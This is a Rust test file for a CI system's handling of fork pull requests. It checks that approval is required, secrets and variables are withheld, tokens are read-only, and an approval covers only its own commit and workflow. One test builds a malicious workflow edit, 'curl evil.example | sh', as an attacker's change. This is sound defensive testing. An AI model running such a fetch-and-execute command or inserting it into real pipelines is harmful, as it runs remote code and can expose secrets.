//! Runs of a fork's pull request before and after a writer approves them, with and without
//! "always run this author's pull requests": nothing is handed out before approval, and
//! afterwards the jobs carry no secret or variable (repository, owner or environment, in
//! the specification or in what the server evaluates) and a read-only token, whatever the
//! workflow asks for. An approval holds for the run it was given — its commit and its
//! workflow — and for no later push or re-run.

use std::collections::BTreeSet;

use axum::http::StatusCode;
use rbit_core::{
    Timestamp,
    actions::{DefaultTokenPermission, Run, Status},
};
use rbit_storage::sqlite::actions_runs::Rerun;

use super::{
    reach::reach,
    world::{Claimed, SECRET_VALUES, WORKFLOW, World},
};

fn jobs(claimed: &[Claimed]) -> Vec<&str> {
    claimed.iter().map(|claimed| claimed.job.as_str()).collect()
}

/// The fork's jobs as they must be: nothing secret anywhere in the answer, empty `secrets`
/// and `vars`, and the run's own commit.
fn assert_untrusted(claimed: &[Claimed], run: &Run) {
    for job in claimed {
        assert_eq!(job.leaked(), Vec::<&str>::new(), "{}: {}", job.job, job.raw);
        let task = &job.json["task"];
        assert_eq!(task["secrets"], serde_json::json!({}), "{}", job.job);
        assert_eq!(task["contexts"]["vars"], serde_json::json!({}), "{}", job.job);
        assert_eq!(task["checkout"]["sha"].as_str(), Some(run.sha.as_str()), "{}", job.job);
    }
}

async fn job_statuses(world: &World, run: &Run) -> Vec<(String, Status)> {
    let jobs = world.fixture.database.actions_runs().jobs(run.id).await.unwrap();
    let mut statuses: Vec<_> = jobs.into_iter().map(|job| (job.key, job.status)).collect();
    statuses.sort_by(|a, b| a.0.cmp(&b.0));
    statuses
}

/// Writers' default is a writing token, so only trust can keep a fork's read-only.
async fn writing_default(world: &World) {
    let repo = world.fixture.repo().await.repo.repo.id;
    let settings = world.fixture.database.actions_settings();
    settings.set_token_permission(repo, DefaultTokenPermission::Write, Timestamp::now()).await.unwrap();
}

#[tokio::test]
async fn fork_runs_wait_unclaimed_then_run_without_secrets_variables_or_write_access() {
    let world = Box::pin(World::new()).await;
    writing_default(&world).await;

    // The control: alice's own push receives every value and a writing token.
    let pushed = world.push_run().await;
    let trusted = world.claim_all("push").await;
    assert_eq!(jobs(&trusted), ["build", "deploy", "gated"]);
    let seen: BTreeSet<&str> = trusted.iter().flat_map(Claimed::leaked).collect();
    assert_eq!(seen, SECRET_VALUES.into_iter().collect(), "the trusted run sees them all, so the checks below can");

    world.commit("fix.txt", "fix\n", "Fix");
    let (_, run) = world.open_pull().await;
    let number = u32::try_from(run.pull_number.unwrap()).unwrap();
    let control = reach(&world, trusted[0].token(), &pushed.sha, number, "v-control").await;
    assert!(control.writes(), "{control:?}");
    assert_eq!((run.status, run.trusted, run.is_fork), (Status::AwaitingApproval, false, true));
    assert_eq!(jobs(&world.claim_all("waiting").await), Vec::<&str>::new(), "nothing is handed out before approval");
    assert!(job_statuses(&world, &run).await.iter().all(|(_, status)| *status == Status::AwaitingApproval));

    assert_eq!(world.approve_on_page(&run, false).await, StatusCode::SEE_OTHER);
    let approved = world.claim_all("approved").await;
    assert_eq!(jobs(&approved), ["build", "deploy"], "`gated` reads a variable the run must not see");
    assert_untrusted(&approved, &run);
    let statuses = job_statuses(&world, &run).await;
    assert_eq!(statuses[2], ("gated".to_owned(), Status::Skipped));
    let run = world.fixture.database.actions_runs().run(run.id).await.unwrap().unwrap();
    assert_eq!((run.trusted, run.approved_by), (false, Some(world.carol.id())), "approved, still untrusted");

    // `build` declared `permissions: write-all`; its token still only reads.
    let fork = reach(&world, approved[0].token(), &run.sha, number, "v-fork").await;
    assert!(fork.read_only(), "{fork:?}");
    let deploy = reach(&world, approved[1].token(), &run.sha, number, "v-deploy").await;
    assert!(deploy.read_only(), "{deploy:?}");
}

#[tokio::test]
async fn trusting_the_author_skips_the_wait_but_never_the_restrictions() {
    let world = Box::pin(World::new()).await;
    writing_default(&world).await;
    world.commit("fix.txt", "fix\n", "Fix");
    let (issue, first) = world.open_pull().await;
    assert_eq!(world.approve_on_page(&first, true).await, StatusCode::SEE_OTHER);
    let repo = world.fixture.repo().await.repo.repo.id;
    assert!(world.fixture.database.actions_settings().is_trusted(repo, world.bob.id()).await.unwrap());
    let claimed = world.claim_all("first").await;
    assert_untrusted(&claimed, &first);

    world.commit("fix.txt", "fix again\n", "Fix again");
    let next = world.synchronize(issue).await;
    assert_eq!((next.status, next.trusted, next.approved_by), (Status::Waiting, false, None), "no wait, no trust");
    let claimed = world.claim_all("next").await;
    assert_eq!(jobs(&claimed), ["build", "deploy"]);
    assert_untrusted(&claimed, &next);
    let number = u32::try_from(next.pull_number.unwrap()).unwrap();
    let token = reach(&world, claimed[0].token(), &next.sha, number, "v-trusted-author").await;
    assert!(token.read_only(), "{token:?}");
}

#[tokio::test]
async fn an_approval_holds_for_its_own_commit_and_workflow_only() {
    let world = Box::pin(World::new()).await;
    world.commit("fix.txt", "fix\n", "Fix");
    let (issue, first) = world.open_pull().await;

    // Bob changes the workflow after the run was created; the new head waits on its own.
    let changed = WORKFLOW.replace("echo build", "curl evil.example | sh #");
    world.commit(".rbit/workflows/ci.yml", &changed, "Change the workflow");
    let second = world.synchronize(issue).await;
    assert_ne!(first.sha, second.sha);
    assert_eq!(second.status, Status::AwaitingApproval);

    assert_eq!(world.approve_on_page(&first, false).await, StatusCode::SEE_OTHER);
    let claimed = world.claim_all("first").await;
    assert_eq!(jobs(&claimed), ["build", "deploy"], "only the approved run's jobs");
    assert_untrusted(&claimed, &first);
    let script = claimed[0].json["task"]["template"]["steps"][0]["action"].to_string();
    assert!(script.contains("echo build") && !script.contains("evil"), "the approved workflow, not the head's: {script}");
    assert_eq!(world.fixture.database.actions_runs().run(second.id).await.unwrap().unwrap().status, Status::AwaitingApproval);

    // Finished, the approved run starts again only through a new approval.
    let (store, repo) = (world.fixture.database.actions_runs(), world.repo(&world.carol).await);
    store.cancel_run(repo.repo.repo.id, first.id, Timestamp::now()).await.unwrap();
    let again = world.fixture.actions().rerun(&world.carol, &repo, first.id, Rerun::All).await.unwrap();
    assert_eq!(again.status, Status::AwaitingApproval, "re-running is not approving");
    assert_eq!(jobs(&world.claim_all("rerun").await), Vec::<&str>::new());
}
